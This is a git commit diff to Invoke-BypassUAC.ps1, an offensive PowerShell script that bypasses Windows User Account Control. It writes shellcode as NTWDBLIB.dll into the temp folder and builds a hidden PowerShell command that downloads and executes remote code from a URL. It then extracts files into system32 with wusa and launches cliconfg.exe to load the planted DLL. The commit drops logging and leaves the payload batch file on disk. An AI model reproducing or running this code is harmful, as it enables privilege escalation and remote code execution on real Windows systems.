0c5fc4e6eadf4387ed8794aae3543ab7f0b340fb
Tru5tNo1 <delaurentis@live.it>
2015-04-09 13:18:03 +0200

    Update Invoke-BypassUAC.ps1

--- Invoke-BypassUAC.ps1
+++ Invoke-BypassUAC.ps1
@@ -2926,7 +2926,7 @@ Param(
 add-content -value $sc64 -encoding byte -path $env:temp\NTWDBLIB.dll
 
 
-$powercommand = "powershell.exe -windowstyle hidden -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command" + " > %TEMP%\LOG.TXT"
+$powercommand = "powershell.exe -windowstyle hidden -Exec ByPass IEX (new-object Net.WebClient).DownloadString('$url'); $command"
 $powercommand 
 $powercommand | OUT-file -encoding default -file $env:temp\payload.bat
 #$Spayload= "start /b %temp%\pay.bat" | OUT-file -encoding default -file $env:temp\payload.bat
@@ -2939,6 +2939,6 @@ wusa $env:temp\poc.tmp /extract:c:\windows\system32\
 $com = 'c:\windows\system32\cliconfg.exe'
 Invoke-Expression -Command:$com 
 sleep -seconds 3
-del $env:temp\payload.bat
+#del $env:temp\payload.bat
 
 }
